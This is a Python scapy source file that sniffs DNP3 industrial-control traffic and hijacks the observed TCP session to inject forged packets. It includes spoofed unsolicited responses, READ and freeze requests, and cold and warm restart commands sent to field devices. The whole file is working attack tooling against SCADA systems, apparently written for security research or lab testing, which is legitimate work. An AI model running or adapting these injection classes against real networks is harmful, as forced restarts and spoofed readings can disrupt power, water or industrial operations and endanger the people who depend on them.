__author__ = 'Nicholas Rodofile'
from DNP3_Lib.DNP3_Lib_ import *
from DNP3_spoofable_messages import *
from scapy.all import IP, TCP


'''

This class is used to sniff network traffic form a mirror port and inject DNP3 unsolicited responses

Usage:

injector = Inject()
sniff(iface='eth1', filter="tcp and host 192.168.10.221", prn=injector.process_pkt, count=30)

'''

class Inject(object):
    def __init__(self):
        self.count = 0

        #Create DNP3/TCP Packet instance  for injection
        self.dlink_ctr = DNP3HeaderControl(DIR=0)
        self.data_link = DNP3(CONTROL=self.dlink_ctr)
        self.transport = DNP3Transport(FIN=SET, FIR=SET)
        self.app_ctrl = DNP3ApplicationControl(FIN=SET, FIR=SET, CON=SET, UNS=SET)
        self.app = DNP3ApplicationResponse(Application_control=self.app_ctrl, FUNC_CODE="UNSOLICITED_RESPONSE")
        self.ether = Ether()
        self.ip = IP()
        self.tcp = TCP(flags="PA")

        # Unsolicited Response bytes
        # 020117010101
        #self.app_data = "020117010101".decode("hex")

        self.dnp3 = self.data_link/self.transport #/self.app #/self.app_data
        self.tcp_ip = self.ether/self.ip/self.tcp
        self.injection = self.tcp_ip/self.dnp3/self.app_data()
        #self.injection.show()

    def sendp(self, p, verbose=0):
        sendp(p, verbose=verbose)
        print "Inject", p.summary()

    def app_data(self):
        # Unsolicited Response bytes
        data = "020117010101".decode("hex")
        app = DNP3ApplicationResponse(Application_control=self.app_ctrl, FUNC_CODE="UNSOLICITED_RESPONSE")
        return app/data

    def inject_packet(self):
        for i in range(0, 3):
            self.sendp(self.injection)
            self.injection[DNP3].SEQUENCE = self.injection[DNP3].SEQUENCE + 1
            self.injection[TCP].seq =  self.injection[TCP].seq + len(self.injection[DNP3])

    def update_injection(self, p):
        self.injection[Ether].src = p[Ether].src
        self.injection[Ether].dst = p[Ether].dst
        self.injection[IP].src = p[IP].src
        self.injection[IP].dst = p[IP].dst
        self.injection[TCP].sport = p[TCP].sport
        self.injection[TCP].dport = p[TCP].dport
        self.injection[TCP].seq = p[TCP].seq + len(p[DNP3])
        self.injection[TCP].ack = p[TCP].ack
        self.injection[DNP3].SOURCE = p[DNP3].SOURCE
        self.injection[DNP3].DESTINATION = p[DNP3].DESTINATION
        if p.haslayer(DNP3Transport):
            self.injection[DNP3].SEQUENCE = p[DNP3].SEQUENCE
            self.injection[DNP3].SEQUENCE += 1
            self.injection[DNP3ApplicationControl].SEQ = p[DNP3ApplicationControl].SEQ
            self.injection[DNP3ApplicationControl].SEQ += 1
            #self.injection.show()
        self.count += 1
        if self.count == 10:
            self.inject_packet()

    def process_pkt(self, p):
        if p.haslayer(DNP3):
            if p.haslayer(DNP3ApplicationResponse):
                self.update_injection(p)


class InjectionPush(Inject):
    def __init__(self):
        Inject.__init__(self)
        self.tcp.flags = "P"


class InjectSlave(Inject):
    def app_data(self):
        app_ctrl = DNP3ApplicationControl(FIN=SET, FIR=SET, CON=UNSET, UNS=UNSET)
        app = DNP3ApplicationRequest(Application_control=app_ctrl, FUNC_CODE="READ")
        return app/data

    def process_pkt(self, p):
        if p.haslayer(DNP3ApplicationRequest):
            self.update_injection(p)


class InjectionFreezeObj(InjectSlave):
    def app_data(self):
        app_ctrl = DNP3ApplicationControl(FIN=SET, FIR=SET, CON=UNSET, UNS=UNSET)
        data = binary_counter_default_variation()
        app = DNP3ApplicationRequest(Application_control=app_ctrl, FUNC_CODE="IMMED_FREEZE")
        return app/data


class InjectionColdRestart(InjectSlave):
    def app_data(self):
        app_ctrl = DNP3ApplicationControl(FIN=SET, FIR=SET, CON=UNSET, UNS=UNSET)
        app = DNP3ApplicationRequest(Application_control=app_ctrl, FUNC_CODE="COLD_RESTART")
        return app

class InjectionWarmRestart(InjectSlave):
    def app_data(self):
        app_ctrl = DNP3ApplicationControl(FIN=SET, FIR=SET, CON=UNSET, UNS=UNSET)
        app = DNP3ApplicationRequest(Application_control=app_ctrl, FUNC_CODE="WARM_RESTART")
        return app

